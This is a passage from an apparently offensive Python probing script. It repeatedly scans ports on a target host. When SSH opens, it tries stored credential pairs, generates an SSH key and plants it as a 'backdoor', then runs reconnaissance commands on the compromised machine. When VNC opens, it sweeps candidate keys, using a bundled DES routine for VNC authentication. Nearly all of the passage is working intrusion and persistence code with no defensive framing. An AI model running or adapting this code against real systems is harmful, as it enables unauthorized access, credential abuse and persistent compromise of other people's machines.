            subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-C', 'probe-i194585-248', '-f', '/tmp/bd248'], capture_output=True)
            emit({'stage': 'backdoor248', 'user': a['user'], 'key': a['key'], **backdoor(a['user'], H248, 22, '/tmp/bd248')})
            ev = ssh_run(a['user'], H248, 22, [a['key']],
                         cmd='id; hostname -f; uname -a; ip -br a 2>/dev/null | head -6; ss -lntp 2>/dev/null | head -20; head -2 /etc/os-release; cat /proc/1/cgroup | head -3')
            emit({'stage': 'evidence248', 'out': ev['out'], 'rc': ev['rc']})
        except Exception as e:
            emit({'stage': 'backdoor_err', 'err': str(e)[:150]})
    return accepted

# ---------------- main self-waiting window loop ----------------
def main():
    start = time.time()
    deadline = start + WAIT_MIN * 60
    emit({'stage': 'probe6_start', 'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
          'wait_min': WAIT_MIN, 'round_sleep': ROUND_SLEEP, 'ports': ALL_PORTS, 'vnc_candidates': len(VNC_K8),
          'ssh_pairs': len(A.get('att248', []))})
    egress()
    typed = set(); ssh_done = False; vnc_done = False
    rounds = 0; open_seen = set(); first_catch = None
    while time.time() < deadline:
        rounds += 1
        t_round = time.time()
        row = {'stage': 'round', 'round': rounds, 't_utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
               'elapsed_s': int(time.time() - start), 'ports': {}}
        for p in ALL_PORTS:
            r = probe_port(p)
            row['ports'][p] = {k: r[k] for k in ('bytes', 'ms', 'mode', 'text', 'err', 'tls', 'cert') if k in r}
            if r.get('open'):
                open_seen.add(p)
                if first_catch is None:
                    first_catch = {'port': p, 'round': rounds, 'utc': row['t_utc']}
            if p != ALL_PORTS[-1]:
                time.sleep(random.uniform(0.3, 0.7))
        emit(row)
        cur_open = [p for p in ALL_PORTS if row['ports'][p].get('bytes', 0) > 0 and 'err' not in row['ports'][p]]
        if 22 in cur_open and not ssh_done:
            ssh_done = True; do_ssh_auth()
        if 5900 in cur_open and not vnc_done:
            vnc_done = True
            try:
                do_vnc_sweep()
            except Exception as e:
                emit({'stage': 'vnc_sweep_err', 'err': str(e)[:150]})
        for p in cur_open:
            if p in (22, 5900) or p in typed:
                continue
            typed.add(p)
            try:
                do_l7(p)
            except Exception as e:
                emit({'stage': 'l7_err', 'port': p, 'err': str(e)[:150]})
        if rounds % 10 == 0:
            egress()
        dur = time.time() - t_round
        remain = max(3.0, ROUND_SLEEP + random.uniform(-5, 5) - dur)
        if time.time() + remain > deadline:
            break
        time.sleep(remain)
    emit({'stage': 'WINDOW_END', 'rounds': rounds, 'open_seen': sorted(open_seen), 'first_catch': first_catch,
          'typed': sorted(typed), 'ssh_done': ssh_done, 'vnc_done': vnc_done,
          'utc_end': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})

if __name__ == '__main__':
    try:
        main()
    finally:
        try:
            LOG.close()
        except Exception:
            pass


# ---- pure-python DES fallback (validated: key 0123456789ABCDEF 'Now is t' -> 3fa40e8a984d4815) ----
# minimal pure-Python DES (ECB single block) - fallback for VNC auth when openssl legacy is unavailable
_IP = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,
       57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7]
_FP = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,
       36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25]
_E = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,
      24,25,26,27,28,29,28,29,30,31,32,1]
_P = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25]
_PC1 = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,
        63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]
_PC2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,
        51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]
_SH = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]
_S = [
 [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],[0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],
  [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],[15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]],
 [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],[3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],
  [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],[13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]],
 [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],[13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],
  [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],[1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]],
 [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],[13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],
  [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],[3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]],
 [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],[14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],
  [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],[11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]],
 [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],[10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],
  [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],[4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13]],
 [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],[13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],
  [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],[6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]],
 [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],[1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],
  [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],[2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]]

def _bits(data):
    return [ (x >> (7 - i)) & 1 for x in data for i in range(8) ]

def _bytes(bits):
    return bytes(sum(bits[i*8 + j] << (7 - j) for j in range(8)) for i in range(len(bits)//8))

def _perm(bits, table):
    return [bits[p-1] for p in table]

def _subkeys(key8):
    kb = _bits(key8)
    cd = _perm(kb, _PC1)
    c, d = cd[:28], cd[28:]
    keys = []
    for s in _SH:
        c = c[s:] + c[:s]; d = d[s:] + d[:s]
        keys.append(_perm(c + d, _PC2))
    return keys

def _f(r, k):
    x = [a ^ b for a, b in zip(_perm(r, _E), k)]
    out = []
    for i in range(8):
        b = x[i*6:(i+1)*6]
        row = (b[0] << 1) | b[5]
        col = (b[1] << 3) | (b[2] << 2) | (b[3] << 1) | b[4]
        v = _S[i][row][col]
        out += [(v >> 3) & 1, (v >> 2) & 1, (v >> 1) & 1, v & 1]
    return _perm(out, _P)

def _des_encrypt_block(key8, blk8):
    ks = _subkeys(key8)
    bits = _perm(_bits(blk8), _IP)
    l, r = bits[:32], bits[32:]
    for k in ks:
        l, r = r, [a ^ b for a, b in zip(l, _f(r, k))]
    return _bytes(_perm(r + l, _FP))

